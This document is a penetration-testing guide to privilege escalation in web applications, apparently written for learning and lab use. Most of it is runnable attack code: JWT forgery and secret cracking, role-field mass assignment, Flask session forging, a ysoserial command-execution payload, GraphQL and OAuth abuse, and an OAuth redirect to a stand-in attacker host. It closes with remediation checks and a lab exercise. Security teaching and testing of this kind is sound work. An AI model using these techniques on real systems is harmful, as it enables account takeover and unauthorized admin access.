# Privilege Escalation (Web) Guide

> Escalate from low-privilege to high-privilege access in web applications through horizontal/vertical escalation, role manipulation, and JWT abuse. Covers common patterns in modern web architectures.

## 1. Horizontal vs Vertical Escalation

Understand the two escalation directions:

```bash
# Horizontal: Access another user's resources at the same privilege level
# User A accessing User B's data
curl -H "Authorization: Bearer $USER_A_TOKEN" \
  "https://api.target.com/users/user_b_id/documents"

# Vertical: Escalate from regular user to admin
# Modify role claim or access admin endpoints
curl -H "Authorization: Bearer $USER_TOKEN" \
  "https://api.target.com/admin/users"

# Test both directions systematically
echo "[*] Testing vertical escalation..."
for endpoint in /admin /admin/users /admin/settings /internal/debug; do
  STATUS=$(curl -s -o /dev/null -w '%{http_code}' \
    -H "Authorization: Bearer $USER_TOKEN" \
    "https://api.target.com${endpoint}")
  [ "$STATUS" != "403" ] && echo "[+] Accessible: $endpoint ($STATUS)"
done
```

## 2. JWT Token Manipulation

Exploit weak JWT implementations for privilege escalation:

```bash
# Decode JWT without verification
echo "$JWT_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# Attack 1: Algorithm confusion (change RS256 to HS256)
# If server uses RS256 but accepts HS256, sign with the public key
python3 -c "
import jwt
import json

# Get the public key (often exposed at /.well-known/jwks.json)
public_key = open('public_key.pem').read()

# Forge token with admin role, signed with public key as HMAC secret
payload = {
    'sub': '1234567890',
    'name': 'attacker',
    'role': 'admin',
    'iat': 1716000000,
    'exp': 1816000000
}
forged = jwt.encode(payload, public_key, algorithm='HS256')
print(forged)
"
```

```bash
# Attack 2: None algorithm
python3 -c "
import base64, json

header = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({'sub':'1','role':'admin','exp':9999999999}).encode()).rstrip(b'=')
print(f'{header.decode()}.{payload.decode()}.')
"

# Attack 3: Weak secret brute-force
hashcat -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt
# Or use jwt_tool
python3 jwt_tool.py "$JWT_TOKEN" -C -d /usr/share/wordlists/rockyou.txt
```

## 3. Role Parameter Manipulation

Inject or modify role parameters during registration or profile updates:

```bash
# During registration — add hidden role parameter
curl -X POST https://api.target.com/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "attacker",
    "email": "attacker@evil.com",
    "password": "P@ssw0rd123",
    "role": "admin"
  }'

# During profile update — escalate existing account
curl -X PUT https://api.target.com/api/users/me \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Attacker",
    "role": "admin",
    "is_admin": true,
    "permissions": ["read", "write", "admin"]
  }'

# Mass assignment via nested objects
curl -X PATCH https://api.target.com/api/users/me \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"profile": {"name": "test"}, "account": {"type": "premium", "role": "admin"}}'
```

## 4. Cookie and Session Manipulation

Exploit weak session management for escalation:

```bash
# Decode and modify session cookies
# Flask session (base64 + signature)
python3 -c "
import base64, json, zlib

cookie = '$FLASK_SESSION_COOKIE'
# Flask sessions are base64(zlib(json)) + '.' + signature
payload = cookie.split('.')[0]
# Add padding
payload += '=' * (4 - len(payload) % 4)
data = json.loads(zlib.decompress(base64.urlsafe_b64decode(payload)))
print(json.dumps(data, indent=2))
# Look for: role, is_admin, user_id, permissions
"

# If secret key is weak/known, forge a new session
# flask-unsign tool
flask-unsign --decode --cookie "$FLASK_SESSION_COOKIE"
flask-unsign --sign --cookie '{"user_id": 1, "role": "admin"}' --secret 'secret_key'

# ASP.NET ViewState manipulation (if MAC validation is disabled)
ysoserial.exe -g TypeConfuseDelegate -f ObjectStateFormatter -c "cmd /c whoami"
```

## 5. GraphQL Privilege Escalation

Exploit GraphQL's introspection and mutation capabilities:

```bash
# Introspection to discover admin mutations
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { mutationType { fields { name args { name type { name } } } } } }"}'

# Attempt admin mutations with regular user token
curl -X POST https://api.target.com/graphql \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation { updateUserRole(userId: \"my-id\", role: ADMIN) { id role } }"
  }'

# Batch queries to bypass rate limiting on privilege checks
curl -X POST https://api.target.com/graphql \
  -H "Authorization: Bearer $USER_TOKEN" \
  -d '[
    {"query": "mutation { setAdmin(id: \"me\") { success } }"},
    {"query": "{ adminPanel { users { email } } }"}
  ]'
```

## 6. OAuth/OIDC Escalation

Abuse OAuth flows for privilege escalation:

```bash
# Scope escalation — request more permissions than granted
# Original: scope=read
# Tampered: scope=read+write+admin
curl "https://auth.target.com/authorize?client_id=app&scope=read+write+admin&redirect_uri=..."

# Token exchange abuse — swap a low-privilege token for high-privilege
curl -X POST https://auth.target.com/token \
  -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
  -d "subject_token=$LOW_PRIV_TOKEN" \
  -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
  -d "scope=admin"

# Client credential confusion — use another app's client_id
curl -X POST https://auth.target.com/token \
  -d "grant_type=authorization_code" \
  -d "code=$AUTH_CODE" \
  -d "client_id=admin-dashboard-client" \
  -d "redirect_uri=https://attacker.com/callback"
```

## 7. Automated Privilege Escalation Testing

Systematic approach to finding escalation paths:

```python
import requests

def test_privilege_escalation(base_url: str, low_priv_token: str, admin_token: str):
    """Compare accessible endpoints between privilege levels."""
    headers_low = {"Authorization": f"Bearer {low_priv_token}"}
    headers_admin = {"Authorization": f"Bearer {admin_token}"}
    
    # Discover admin-only endpoints by comparing access
    endpoints = [
        "/api/admin/users", "/api/admin/settings", "/api/admin/logs",
        "/api/users/export", "/api/billing/all", "/api/system/config",
        "/api/internal/debug", "/api/management/health",
    ]
    
    escalation_findings = []
    for endpoint in endpoints:
        url = f"{base_url}{endpoint}"
        
        admin_resp = requests.get(url, headers=headers_admin)
        if admin_resp.status_code != 200:
            continue  # Not a valid endpoint
        
        low_resp = requests.get(url, headers=headers_low)
        if low_resp.status_code == 200:
            escalation_findings.append({
                "endpoint": endpoint,
                "severity": "CRITICAL",
                "issue": "Admin endpoint accessible with low-privilege token"
            })
            print(f"[ESCALATION] {endpoint} — accessible without admin role")
    
    return escalation_findings
```

## 8. Remediation Verification

Confirm that privilege escalation fixes are effective:

- Verify JWT signature validation rejects modified tokens
- Confirm role changes require re-authentication
- Test that mass assignment protection blocks role/permission fields
- Verify server-side role checks on every request (not just UI hiding)
- Confirm that token refresh does not preserve escalated privileges
- Test that downgrading a user's role immediately invalidates existing sessions
- Verify GraphQL resolvers enforce field-level authorization

## Hands-on Exercise

Practice privilege escalation using DVWA or WebGoat:

1. **Lab setup**: Deploy DVWA with security level "low"
2. **IDOR testing**: Access user profiles by modifying the `id` parameter in the URL — try sequential values
3. **Role manipulation**: Intercept requests with Burp Suite and modify the `role` parameter from `user` to `admin`
4. **Forced browsing**: Navigate directly to `/admin/`, `/administrator/`, `/manage/` endpoints
5. **API enumeration**: Use `ffuf -u https://target/api/FUZZ -w api-endpoints.txt` to discover hidden endpoints
6. **Document findings**: Record each successful bypass with the request/response evidence
